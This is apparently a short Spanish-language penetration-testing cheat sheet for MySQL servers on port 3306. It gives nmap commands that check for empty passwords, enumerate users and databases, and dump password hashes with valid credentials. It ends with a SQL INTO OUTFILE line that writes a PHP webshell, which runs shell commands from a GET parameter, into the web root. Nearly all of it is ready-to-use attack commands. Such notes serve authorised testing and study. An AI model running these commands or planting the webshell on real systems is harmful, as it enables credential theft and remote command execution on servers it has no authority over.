# MySQL
Servicio de bases de datos SQL usualmente en el puerto 3306
## Enumeración
### Check Empty Password
```nmap
nmap --script=mysql-empty-password -p 3306 IP
```	
## Interacción con el servidor
### Enumeración de usuarios mediante nmap (Authenticated)
```
nmap --script=mysql-users --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
```	
### Obtención del database schema usando nmap (Authenticated)
```
nmap --script=mysql-databases --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
```
### Obtención de hashes usando nmap (Authenticated)
```
nmap --script mysql-dump-hashes --script-args="mysqluser='VALIDUSER',mysqlpass='VALIDPASS'" -p 3306 IP
```		
## Vulnerabilidades comunes sin metasploit
### Pasar de SQL a una  webshell
```SQL
SELECT '<?php echo passthru($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```
